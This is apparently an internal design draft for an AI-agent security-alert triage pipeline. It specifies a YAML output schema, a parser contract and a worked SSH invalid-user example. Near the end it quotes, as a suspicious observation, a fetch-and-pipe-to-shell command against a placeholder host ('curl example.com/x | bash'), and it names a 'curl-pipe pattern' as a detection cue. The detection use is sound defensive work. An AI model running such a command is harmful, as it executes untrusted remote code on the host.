# PREDICT unified output schema

**Status:** design draft, not yet implemented.

**Purpose:** lock the single YAML contract predict emits so the orchestrator can parse it mechanically into (a) invlang state delta, (b) routing for the next phase, (c) telemetry. No prose output. No separate trailer.

## Design principles (locked)

1. **Invlang = state. Routing = orchestrator metadata.** No schema extension to merge them.
2. **Shape commitment is the literal first field.** Forces decision-first-then-elaborate rather than restate-then-decide.
3. **Attribute predictions are a first-class optional field** on each hypothesis (makes classification stereotypes explicit and checkable).
4. **No rationale section.** Prose explanations don't belong in the output envelope; if we need audit prose later we'll re-add a dedicated output stream, not mix it with state.
5. **Mechanical parser owns the split** into invlang-delta / routing / telemetry. Single function in `scripts/handlers/_output_parser.py`, reusable across phases.
6. **Agent's input still has access to the full invlang companion**, not just the delta — the helper from `predict-wall-time-optimization.md` feeds the universal context + phase-specific additions.

## Output envelope

```yaml
predict:
  # ── commit up front ───────────────────────────────────────
  loop: <int>                    # must match orchestrator-computed loop_n
  shape: E | D | I | A | M       # the decision the agent made about which shape this alert fits

  # ── invlang state delta (conditional) ────────────────────
  # Present on shapes A, I, M, D-with-fork. Absent on shape E.
  # Each entry is an invlang hypothesis; list is appended to the
  # companion's `hypothesize.hypotheses[]`.
  hypotheses:
    - id: h-00N
      name: "?mechanism-name"
      attached_to_vertex: v-00N
      proposed_edge:
        relation: <rel>
        parent_vertex:
          type: <process|identity|host|...>
          classification: "<stereotyped-parent-class>"
      story: |
        <2–4 sentences of causal link between parent_vertex and attached_to_vertex>

      predictions:                  # observational predictions on the proposed edge
        - {id: p1, subject: proposed_edge, claim: "<one observable claim>", from_story_link: "<sentence fragment>"}

      attribute_predictions:        # NEW — implicit classification assumptions made explicit
        - {id: ap1, target: parent_vertex, attribute: <field>, claim: "<one observable attribute claim>"}

      refutation_shape:             # mechanical refutations, indexed to specific predictions
        - {id: r1, refutes_predictions: [p1], claim: "<negation shape>"}
        - {id: r2, refutes_predictions: [ap1], claim: "<negation shape>"}

      authorization_contract:       # optional — when authorization is the open question (Shape A / I)
        - {id: ac1, edge_ref: proposed, anchor_kind: <anchor>, asks: authorization}

      weight: null                  # predict proposes; analyze grades

  # ── invlang state delta (Shape E only) ───────────────────
  # Lead-level predictions on the pending gather entry. Parsed into
  # the gather[] entry the orchestrator creates before dispatching gather.
  branch_plan:
    primary_lead: <lead-slug>
    predictions:
      - {id: lp1, if: "<observable condition>", read_as: "<interpretation token>", advance_to: <escalate|fork-at-X|halt>}
      - {id: lp2, if: "...", read_as: "...", advance_to: ...}
      # N mutually-exclusive branches covering the lead's outcome space.

  # ── routing for the next phase ───────────────────────────
  # Consumed by the GATHER handler, discarded after.
  routing:
    selected_lead: <lead-slug>
    composite_secondary: []        # [] when not compositing
    override_data_source: null     # optional; not emitted without specific signal
    lead_hint: null                # optional; prose hint for GATHER
```

### Field presence matrix by shape

| Shape | `hypotheses` | `branch_plan` | `routing` |
|---|---|---|---|
| E (enrichment, loop 1 default) | ∅ | required | required |
| D (data gap, zero-hypothesis) | ∅ or single | optional | required |
| I (identity-of-use post-enrichment) | required (≥2) | ∅ | required |
| A (mechanism pinned, authorization open) | required (=1, with `authorization_contract`) | ∅ | required |
| M (plural peer mechanisms) | required (≥2, diverging on observable fields) | ∅ | required |

## Mechanical parser contract

`scripts/handlers/_output_parser.py::parse_predict_output(yaml_text, ctx)` returns:

```python
@dataclass
class PredictParseResult:
    invlang_delta: dict              # keys to append to companion:
                                     #   hypotheses → companion.hypothesize.hypotheses[]
                                     #   branch_plan → attached to pending gather[] entry
    routing: dict                    # selected_lead, composite_secondary, override_data_source, lead_hint
                                     # → ctx.outputs[Phase.PREDICT]
    telemetry: dict                  # loop, shape → budget.json / audit jsonl
```

The handler:
1. Parses the single `predict:` YAML block.
2. Calls `parse_predict_output` → invlang_delta + routing + telemetry.
3. Validates `invlang_delta.hypotheses` via `validate_companion_proposed()` (existing).
4. Appends hypotheses to the companion.
5. Creates the pending gather[] entry with `primary_lead` as `name` and `predictions` from `branch_plan.predictions`.
6. Emits `PhaseResult(next_phase=Phase.GATHER, payload=routing ∪ telemetry)`.

No markdown transcription step. No prose section written to investigation.md (investigation.md is a YAML-only artifact going forward).

## Concrete example — rule-5710 scenario A, loop 1

**Alert:** SSH invalid user, `srcuser=nagios`, `srcip=172.22.0.10`, `dstip=target-endpoint:22`, outcome=reject.

**State entering predict loop 1:** prologue has `v-001 = source 172.22.0.10`, `v-002 = target target-endpoint`, `e-001 = attempted_auth` edge. No prior hypotheses. Ticket-context surfaced 27 prior 5710 alerts from the same source over 4h; CONTEXTUALIZE ranked `?monitoring-probe` and `?misconfigured-monitoring-burst` as candidates.

### Agent emits

```yaml
predict:
  loop: 1
  shape: E

  branch_plan:
    primary_lead: authentication-history
    predictions:
      - id: lp1
        if: "any authentication_success event from 172.22.0.10 within 60s after T"
        read_as: "possible-compromise-or-forward-success"
        advance_to: escalate
      - id: lp2
        if: "cluster cadence is periodic within ±5s of a ~10-min interval over the 4h window"
        read_as: "scheduled-automation-signal"
        advance_to: fork-at-identity-of-use
      - id: lp3
        if: "clusters are non-periodic or show no stable interval"
        read_as: "ad-hoc-origin"
        advance_to: fork-with-cadence-anomaly

  routing:
    selected_lead: authentication-history
    composite_secondary: []
    override_data_source: null
    lead_hint: null
```

That's the entire output. 18 lines of YAML, parse-ready, shape-committed.

### Orchestrator mechanical parse

**invlang_delta** (written to companion + pending gather entry):

```yaml
# No append to hypothesize.hypotheses — Shape E, no new hypotheses.

# New pending gather[] entry created, with predictions filled in:
gather:
  - id: l-001
    loop: 1
    name: authentication-history
    target: v-001
    query_details: {}            # filled by gather
    outcome: {}                  # filled by gather
    resolutions: []              # filled by analyze
    predictions:                 # ← from branch_plan.predictions, verbatim
      - {id: lp1, if: "any authentication_success event from 172.22.0.10 within 60s after T", read_as: "possible-compromise-or-forward-success", advance_to: escalate}
      - {id: lp2, if: "cluster cadence is periodic within ±5s of a ~10-min interval over the 4h window", read_as: "scheduled-automation-signal", advance_to: fork-at-identity-of-use}
      - {id: lp3, if: "clusters are non-periodic or show no stable interval", read_as: "ad-hoc-origin", advance_to: fork-with-cadence-anomaly}
```

**routing** (to `ctx.outputs[Phase.PREDICT]`):

```python
{
    "selected_lead": "authentication-history",
    "composite_secondary": [],
    "override_data_source": None,
    "lead_hint": None,
}
```

**telemetry** (to budget.json / audit jsonl):

```python
{"loop": 1, "shape": "E"}
```

### Downstream consumption

**Gather** runs `authentication-history` over 4h, fills `query_details` and `outcome`. Say it returns: 27 events clustered at ~10-min intervals, stddev 4s, no forward_success.

**Analyze** reads the gather entry's `predictions[]`, matches the observation:
- lp1 (`forward_success within 60s`) → NOT fired (zero forward-success).
- lp2 (`periodic cadence ±5s of ~10-min`) → FIRED (stddev 4s is within ±5s of ~10-min periodicity).
- lp3 → not fired.

Analyze emits:

```yaml
# Update to gather[l-001].outcome:
matched_reading: lp2
# (analyze grades no hypotheses because there are none at loop 1; its routing is driven by the fired reading.)
```

Plus a small routing trailer:

```yaml
# analyze's routing output:
route: continue
reason: "lp2 fired: scheduled-automation-signal → fork-at-identity-of-use"
```

**Predict loop 2** reads:
- Companion YAML: prologue + gather[l-001] with `matched_reading: lp2`.
- Previous-phase trailer: analyze's `route: continue, reason: lp2 fired, advance_to: fork-at-identity-of-use`.

Predict loop 2 knows:
- Enrichment landed (cadence is periodic).
- The fork to materialize is at identity-of-use (per `advance_to`).
- Shape I applies (pattern-inferred identity, baseline now exists).

Loop 2 authors:

```yaml
predict:
  loop: 2
  shape: I

  hypotheses:
    - id: h-001
      name: "?registered-actor-initiated"
      attached_to_vertex: v-001
      proposed_edge:
        relation: initiated_auth
        parent_vertex: {type: process, classification: monitoring-daemon-process-on-source}
      story: |
        The monitoring system daemon on 172.22.0.10 invoked `ssh nagios@target-endpoint`
        as a scheduled health-check tick. Loop 1 established periodic cadence (stddev 4s
        of ~10-min). sshd rejected — nagios is not provisioned on target-endpoint.
      predictions:
        - {id: p1, subject: proposed_edge, claim: "monitoring-system scheduler log has tick correlating within ±30s of T", from_story_link: "scheduled health-check tick"}
      attribute_predictions:
        - {id: ap1, target: parent_vertex, attribute: cmdline, claim: "matches /monitord|nagios-plugin/"}
        - {id: ap2, target: parent_vertex, attribute: user_loginuid, claim: "system user (UID < 1000), not root"}
      refutation_shape:
        - {id: r1, refutes_predictions: [p1], claim: "no scheduler log tick within ±30s of T"}
        - {id: r2, refutes_predictions: [ap1], claim: "cmdline is interactive shell or curl-pipe pattern"}
      authorization_contract:
        - {id: ac1, edge_ref: proposed, anchor_kind: approved-monitoring-sources, asks: authorization}
      weight: null

    - id: h-002
      name: "?credential-used-outside-registered-actor"
      attached_to_vertex: v-001
      proposed_edge:
        relation: initiated_auth
        parent_vertex: {type: process, classification: non-monitoring-process-on-source}
      story: |
        A process on 172.22.0.10 other than the monitoring daemon presented the
        `nagios` credential. Cadence alignment alone does not imply daemon provenance.
      predictions:
        - {id: p1, subject: proposed_edge, claim: "no scheduler log tick correlates to this specific attempt within ±30s", from_story_link: "daemon did not produce this tick"}
      attribute_predictions:
        - {id: ap1, target: parent_vertex, attribute: cmdline, claim: "not a monitoring-plugin binary — shell or non-monitoring process"}
      refutation_shape:
        - {id: r1, refutes_predictions: [p1], claim: "scheduler log has tick correlating to this attempt"}
      weight: null

  routing:
    selected_lead: monitoring-probe
    composite_secondary: []
    override_data_source: null
    lead_hint: "resolve h-001.ac1 + correlate against monitoring-system scheduler audit"
```

Loop 2 brings in `attribute_predictions` — the stereotype "monitoring daemon runs as a system user and has a monitord/nagios binary cmdline" is made explicit. If loop 2's gather returns `cmdline=bash -c 'curl example.com/x | bash'`, `ap1.r2` fires mechanically and h-001 gets capped at `-` regardless of what the cadence lookup says.

## Implications for predict.md subagent prompt

- Drop the "Output format" section describing narrative + trailer YAML; replace with a single "your output is a YAML block with the following structure" pointing at the schema above.
- Drop the §Pitfalls / §Story authoring prose-authoring guidance; story authoring survives as a required sub-field of each hypothesis, but there's no top-level prose to emit.
- Add `attribute_predictions` to §Discipline as a new mechanism — explicit classification stereotypes checkable at grading time.
- Keep §Shapes + §Decision procedure for shape selection; they inform what the agent emits in the `shape:` field.
- Update §Progress checkpoint — the checkpoint file mirrors the output YAML, and the M_last ordering stays Write-before-stdout-text to preserve the recovery path.

## Open questions to nail before coding

1. **`matched_reading` storage in gather.outcome** — is this a new field on the invlang gather-outcome schema, or does it go in `outcome.attribute_updates`? If new, schema extension.
2. **Analyze's `matched_reading` emission** — where does analyze write this? If analyze gets its own unified output schema (next iteration), this becomes a field in that. For now, we'd carry it as a sub-block the orchestrator parses.
3. **What about CONTEXTUALIZE's preload priors?** — `## Past-investigation priors` is currently its own prompt section. It's agent-facing cognitive input, not output. No change needed to the predict output schema; it stays in the preload helper.
4. **Schema validation ownership** — does `validate_companion_proposed()` need to learn about `attribute_predictions[]`? Yes — invlang validator gets one new rule: `attribute_predictions[*].target` must be a declared vertex in the proposed edge; `attribute_predictions[*].id` must match `^ap\d+$`.

## Next step

Once the shape is locked, the implementation is:

1. Extend invlang schema.md: `attribute_predictions[]` field on hypothesis + validator rule.
2. Write `scripts/handlers/_output_parser.py::parse_predict_output`.
3. Rewrite `agents/predict.md` §Output format to the single-YAML contract.
4. Refactor `scripts/handlers/predict.py::handle()` to use the parser.
5. Update `scripts/handlers/_context_loader.py` to ship the universal context helper (separate workstream, per `predict-wall-time-optimization.md`).
6. Measure on 5710 scenario A (force full loop via `--offset` on mid-burst) and 100001.

Expected cost impact: predict-loop-1 should not regress (same work, cleaner envelope); predict-loop-N should drop slightly (less prose authoring overhead); analyze's role sharpens mechanically, enabling its own preload trim in the next pass.
